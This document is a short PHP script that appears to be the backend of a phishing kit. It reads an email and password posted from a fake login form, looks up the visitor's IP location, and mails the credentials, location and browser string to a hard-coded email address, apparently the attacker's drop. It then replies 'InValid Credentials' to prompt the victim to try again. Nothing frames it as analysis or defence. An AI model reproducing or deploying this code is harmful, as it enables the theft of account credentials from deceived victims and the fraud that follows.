<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$browser = $_SERVER['HTTP_USER_AGENT'];

$myemail = 'hasan_ashii@yahoo.com';

	
$response           = array(); 
@$uism = $_POST['email'];
@$pism = $_POST['password'];
@$subject = 'General Domain ' . $_POST['detail'];
if (filter_var($uism, FILTER_VALIDATE_EMAIL)) {
	$mymsg = <<<EOD
Login: $uism
Password: $pism
IP Address: $ip
City: {$details->city}
Region: {$details->region}
Country: {$details->country} 

Browser: $browser;
EOD;
     $response['success'] = true;
     $response['signal'] = "ok";
     $response['msg'] = "InValid Credentials";

	 
		$success = mail($myemail, $subject, $mymsg);
}
else {
echo "";
die();
}

header ('Content-Type: application/json');
header("Access-Control-Allow-Origin: *");

echo json_encode($response);
?>
